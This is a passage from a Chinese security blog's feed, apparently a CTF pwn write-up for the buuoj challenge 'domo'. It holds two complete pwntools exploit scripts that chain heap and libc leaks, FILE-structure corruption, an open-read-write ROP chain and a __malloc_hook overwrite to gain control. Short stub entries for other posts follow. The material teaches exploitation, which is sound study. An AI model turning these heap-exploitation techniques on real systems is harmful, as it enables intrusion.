class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>, <span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak heap----------------</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"\x10"</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">heap_addr=u64 (p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">free (<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------leak libc----------------</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">"A"</span>* <span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'b'</span>* <span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'c'</span> *<span class="number">0x68</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'d'</span> *<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'e'</span>*<span class="number">56</span>+p64(<span class="number">0x71</span>)+<span class="string">'e'</span>*<span class="number">176</span>+ p64(<span class="number">0x100</span>) +p64(<span class="number">0x21</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,p64 (<span class="number">0x21</span>) *<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x11"</span>*<span class="number">0x60</span>+p64(<span class="number">0x300</span>)) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'flag'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+<span class="string">'\x22'</span>*<span class="number">0x58</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc.address=main_arena<span class="number">-0x3c4b78</span></span><br><span class="line">environ_addr=libc.symbols[<span class="string">"environ"</span>]</span><br><span class="line">stdout_hook=libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">stdin_hook=libc.symbols[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line">_IO_file_jumps=libc.symbols[<span class="string">"_IO_file_jumps"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak stack_addr--------------</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload+=p64(stdout_hook<span class="number">-0x43</span>)</span><br><span class="line">add(<span class="number">0x118</span>,payload) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">5</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+p64(_IO_file_jumps)+p64(<span class="number">0xfbad1800</span>)+p64(stdout_hook+<span class="number">131</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(environ_addr)+p64(environ_addr+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"len="</span>,hex(len(payload))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,payload) <span class="comment">#6</span></span><br><span class="line">stack_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xf2</span></span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------Write orw to stack----------</span></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0xf8</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)) <span class="comment">#4</span></span><br><span class="line">free2(<span class="number">0</span>)</span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)) <span class="comment">#7</span></span><br><span class="line">free2(<span class="number">7</span>)</span><br><span class="line">add2(<span class="number">0x108</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)+p64(stdin_hook<span class="number">-0x28</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'flag'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.search(asm(<span class="string">"pop rdi\nret"</span>)).next()</span><br><span class="line">pop_rsi_ret=libc.search(asm(<span class="string">"pop rsi\nret"</span>)).next()</span><br><span class="line">pop_rdx_ret=libc.search(asm(<span class="string">"pop rdx\nret"</span>)).next()</span><br><span class="line"></span><br><span class="line">open_addr=libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">read_addr=libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">puts_addr=libc.symbols[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">orw=p64(pop_rdi_ret)+p64(heap_addr+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">72</span>)+p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x100</span>)+p64(puts_addr)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">"_IO_file_jumps"</span>])+p64(<span class="number">0</span>)+ p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(stack_addr)+p64(stack_addr+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">edit(stdin_hook<span class="number">-0x20</span>,<span class="string">'\x7f'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,payload)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"5\n"</span>+orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><p>还有另一种非预期思路，打<code>malloc_hook</code>,然后利用<code>scanf</code>函数输入过多字符，会调用<code>malloc</code>申请内存</p><p>这里<code>onegadget</code>都失效了，用<code>realloc</code>调整偏移即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + malloc_hook-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">malloc_hook_payload2=<span class="string">'b'</span>*<span class="number">0xb</span>+p64(one[<span class="number">2</span>]+libc.address)+p64(sym(<span class="string">"realloc"</span>)+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,malloc_hook_payload2) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg(0x12D7)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">'0'</span>*<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;domo&quot;&gt;&lt;a href=&quot;#domo&quot; class=&quot;headerlink&quot; title=&quot;domo&quot;&gt;&lt;/a&gt;domo&lt;/h2&gt;&lt;p&gt;一道 domo日了一天，最后还是做出来，还是很高兴的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;off-by-null&lt;/code&gt;漏洞，e
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>gcc编译器和clang编译器的对比分析</title>
    <link href="https://nocbtm.github.io/2020/05/11/gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cclang%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/05/11/gcc编译器和clang编译器的对比分析/</id>
    <published>2020-05-11T13:36:10.000Z</published>
    <updated>2020-09-01T10:49:40.807Z</updated>
    
    <content type="html"><![CDATA[<p>咕咕咕，留个坑。等有时间再写</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;咕咕咕，留个坑。等有时间再写&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一种新的动态链接方式</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.521Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX19MTnpVvzAFSneDjnVJDZ7jYdMFNoyyWG8= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-25T03:32:08.776Z</updated>
    
